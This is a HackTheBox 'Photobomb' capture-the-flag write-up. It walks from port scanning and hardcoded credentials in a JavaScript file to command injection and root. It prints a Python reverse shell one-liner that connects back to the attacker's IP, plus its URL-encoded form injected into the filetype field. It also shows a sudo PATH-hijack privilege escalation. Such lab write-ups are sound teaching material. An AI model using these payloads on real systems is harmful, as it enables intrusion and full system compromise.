![image1](https://github.com/visionthex/Photobomb/blob/main/Images/image1.png)
[![Hackthebox](https://img.shields.io/badge/HackTheBox-111927?style=for-the-badge&logo=Hack%20The%20Box&logoColor=9FEF00)](https://hackthebox.com)

# HackTheBox: Photobomb Writeup

## Photobomb
### Reconnaissance | Scanning

To begin with, our first priority is to conduct reconnaissance using the provided IP. Our plan is to perform an Nmap scan of the network in order to identify any open ports.

![image2](https://github.com/visionthex/Photobomb/blob/main/Images/image2.png "Nmap Scan")

By analyzing the current status, we can observe that only two ports are accessible: port 22 and port 80. The latter, identified as an http port, appears to be running nginx 1.18.0 on Ubuntu. Our next course of action is to focus on port 80 and investigate any potential website content. Utilizing the given IP address of `10.129.228.60`, we can explore the contents available on this specific port.

![image3](https://github.com/visionthex/Photobomb/blob/main/Images/image3.png "IP Showing URL Name")

At this point, we need to include the new URL `photobomb.htb` to the `/etc/hosts` file to access the corresponding webpage. From here we will nano into the `/etc/hosts` file.

![image4](https://github.com/visionthex/Photobomb/blob/main/Images/image4.png "etc/hosts file")

With the updated IP and URL added to the `/etc/hosts` file, we can now revisit the browser and access the photobomb.htb link. This will allow us to delve deeper into the website and conduct further investigation.

![image5](https://github.com/visionthex/Photobomb/blob/main/Images/image5.png "Webpage working properly")

On the page, we have a hyperlink "click here!" that leads to `photobomb.htb/printer`. Upon clicking on the link, a login popup appears. We attempted to log in with the credentials [![Credentials](https://img.shields.io/badge/admin:-admin-red)](https://shields.io/), but no response was generated. Cancelling the login led us to a 401 Authorization Required error, accompanied by nginx/1.18.0 (Ubuntu) message.

![image6](https://github.com/visionthex/Photobomb/blob/main/Images/image6.png "Login")

![image7](https://github.com/visionthex/Photobomb/blob/main/Images/image7.png "401 Authorization Required Link: photobomb.htb/printer")

Our next step is to examine the source code of the photobomb.htb webpage. After some investigation, we discovered a photobomb.js file that we can explore further.

![image8](https://github.com/visionthex/Photobomb/blob/main/Images/image8.png "photobomb.js file that show credentials")

After conducting a thorough examination of the photobomb.js file, we have uncovered the existence of credentials embedded within the Javascript code. Our next step is to attempt to log in using the credentials [![Credentials](https://img.shields.io/badge/pH0t0:-b0Mb!-green)](https://shields.io/).

![image9](https://github.com/visionthex/Photobomb/blob/main/Images/image9.png "Login page for phtobomb.htb/printer")
![image10](https://github.com/visionthex/Photobomb/blob/main/Images/image10.png "Bottom of page with Download Photo button")

Our next course of action is to set up BurpSuite in order to intercept the connections originating from the "Download Photo to Print" button. This will allow us to view any information or prompts that may appear prior to the page progressing further.

![image11](https://github.com/visionthex/Photobomb/blob/main/Images/image11.png "Intercepting with BurpSuite")

### Gaining Access
At this point, we can begin testing for any potential vulnerabilities with the "Download Photo to Print" button. Our initial approach will be to test for a delay or timing attack by attempting to cause a five-second delay and observing the response.

After conducting further testing and experimenting with the sleep function, it has been confirmed that the page can be made to sleep for five seconds. This may indicate the presence of a potential vulnerability that could be further exploited.

To obtain a reverse shell, we utilized the Online Reverse Shell Generator (revshells.com) and selected the Python3 #1 option.

```
export RHOST="10.10.14.78";export RPORT=5555;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`
```

Our next step will involve URL encoding the reverse shell and embedding it into the `&filetype=jpg&` field in BurpSuite. Additionally, we must establish a Netcat listener. The method I used to URL encode the reverse shell is by utilizing the built-in function in BurpSuite.

```
%3bexport%20RHOST%3D%2210.10.14.78%22%3Bexport%20RPORT%3D5555%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22sh%22%29%27
```
![image12](https://github.com/visionthex/Photobomb/blob/main/Images/image12.png "URL Encoded Reverse Shell")

Upon advancing the page in BurpSuite, we successfully captured traffic using the Netcat listener. This indicates that the reverse shell was successfully executed and that we have gained access to the target system.

![image13](https://github.com/visionthex/Photobomb/blob/main/Images/image13.png "Netcat Listener | User Wizard")

Now that we have gained access to the target system, we can proceed to investigate the user "Wizard" and explore the contents of their account.

![image14](https://github.com/visionthex/Photobomb/blob/main/Images/image14.png "Traversing Directories found User Flag")

### Maintaining Access
After traversing through the system directories, I successfully obtained the user flag from the "user.txt" file. Our next step will be to obtain root privileges through privilege escalation.

![image15](https://github.com/visionthex/Photobomb/blob/main/Images/image15.png "Sudo -l")

Using the command `sudo -l`, we were able to determine the type of root privileges granted to the user. It appears that the user has root privileges to execute the command `/opt/clean.sh`. To proceed, we will investigate the `/opt/clean.sh` file by running the `cat /opt/clean.sh` command. This will display the contents of the file in the terminal.

![image16](https://github.com/visionthex/Photobomb/blob/main/Images/image16.png "cat /opt/cleanup.sh")

In the next step, we need to switch to the bash shell and then set the executable permission for the `find` file to gain complete access. We can accomplish this by running `chmod +x find`. The command `echo bash > find` will create a file named `find` in the current directory and write the string `bash` to it. If the file already exists, it will be overwritten.

![image17](https://github.com/visionthex/Photobomb/blob/main/Images/image17.png "echo bash > find | chmod +x find")

The next command is `sudo PATH=$PWD:$PATH /opt/cleanup.sh`. This will add the current working directory to the beginning of the $PATH environment variable, giving priority to any executables in the current directory over those in other directories. Then, it runs the `/opt/clean.sh` script with sudo, which will execute with root privileges because of the sudo command.

![image18](https://github.com/visionthex/Photobomb/blob/main/Images/image18.png "Root Access")

Once you have root access, you can investigate the system further for any important information, such as configuration files, logs, and running processes. This will help you understand how the system works and identify any potential vulnerabilities or misconfigurations that can be exploited. You can also check for any user accounts, credentials, or sensitive data that may be stored on the system. It's important to document your findings and take steps to secure the system to prevent future attacks.

![image19](https://github.com/visionthex/Photobomb/blob/main/Images/image19.png "Root Flag")
